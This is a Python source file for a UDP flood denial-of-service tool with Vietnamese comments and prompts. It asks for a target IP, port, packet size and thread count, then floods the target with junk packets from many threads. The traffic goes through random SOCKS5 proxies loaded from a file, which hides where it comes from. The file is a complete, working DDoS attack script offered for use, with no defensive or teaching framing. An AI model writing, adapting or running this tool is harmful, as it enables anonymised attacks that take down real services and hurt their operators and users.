import socks
import socket
from threading import Thread
from random import randint, choice
from time import time, sleep
import sys

class Brutalize:
    def __init__(self, ip, port, force, threads, proxy_file):
        self.ip = ip
        self.port = port
        self.force = force  # default: 1250 bytes per packet
        self.threads = threads  # default: 100
        self.proxies = self.load_proxies(proxy_file)  # Đọc danh sách proxy từ file

        if not self.proxies:
            print("Không có proxy SOCKS5 hợp lệ trong file proxy_socks5.txt! Thoát...")
            sys.exit(1)

        self.data = str.encode("x" * self.force)  # Gói tin giả mạo
        self.len = len(self.data)
        self.on = True
        self.sent = 0

    def load_proxies(self, filename):
        """ Đọc danh sách proxy SOCKS5 từ file """
        try:
            with open(filename, "r") as f:
                proxies = [line.strip() for line in f if line.strip()]
            return proxies
        except FileNotFoundError:
            print("File proxy_socks5.txt không tồn tại!")
            sys.exit(1)

    def get_proxy_socket(self):
        """ Tạo socket kết nối qua proxy SOCKS5 ngẫu nhiên """
        proxy = choice(self.proxies)
        proxy_ip, proxy_port = proxy.split(":")
        proxy_port = int(proxy_port)

        s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
        s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
        s.settimeout(5)

        return s

    def flood(self):
        """ Khởi động tấn công DDoS """
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()

    def info(self):
        """ Hiển thị thông tin tấn công """
        interval = 0.05
        now = time()
        size = 0
        self.total = 0

        while self.on:
            sleep(interval)
            if size != 0:
                self.total += self.sent * 8 / 1e9 * interval  # Convert bytes -> Gb
                print(f"Tốc độ: {round(size)} Mb/s | Tổng: {round(self.total, 1)} Gb", end="\r")

            now2 = time()
            if now + 1 >= now2:
                continue

            size = round(self.sent * 8 / 1e6)  # Convert bytes -> Mb
            self.sent = 0
            now += 1

    def stop(self):
        """ Dừng tấn công """
        self.on = False

    def send(self):
        """ Gửi gói tin qua proxy SOCKS5 """
        while self.on:
            try:
                sock = self.get_proxy_socket()
                sock.sendto(self.data, (self.ip, self._randport()))
                self.sent += self.len
            except:
                pass
            finally:
                sock.close()

    def _randport(self):
        return self.port or randint(1, 65535)


def main():
    ip = input("Nhập IP mục tiêu: ")
    try:
        if ip.count('.') != 3:
            raise ValueError
        int(ip.replace('.', ''))
    except:
        print("Lỗi! Vui lòng nhập IP hợp lệ.")
        return

    port = input("Nhập port (Enter để chọn ngẫu nhiên): ")
    port = int(port) if port.isdigit() else None

    force = input("Bytes per packet (Enter để mặc định 1250): ")
    force = int(force) if force.isdigit() else 1250

    threads = input("Nhập số luồng (Enter để mặc định 100): ")
    threads = int(threads) if threads.isdigit() else 100

    proxy_file = "proxy_socks5.txt"  # Tool chỉ lấy proxy từ file này

    print(f"Bắt đầu tấn công {ip}:{port or 'Random'} qua proxy SOCKS5...")

    brute = Brutalize(ip, port, force, threads, proxy_file)
    try:
        brute.flood()
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        print(f"\nDừng tấn công {ip}:{port or 'Random'}. Tổng dữ liệu gửi: {round(brute.total, 1)} GB")


if __name__ == "__main__":
    main()
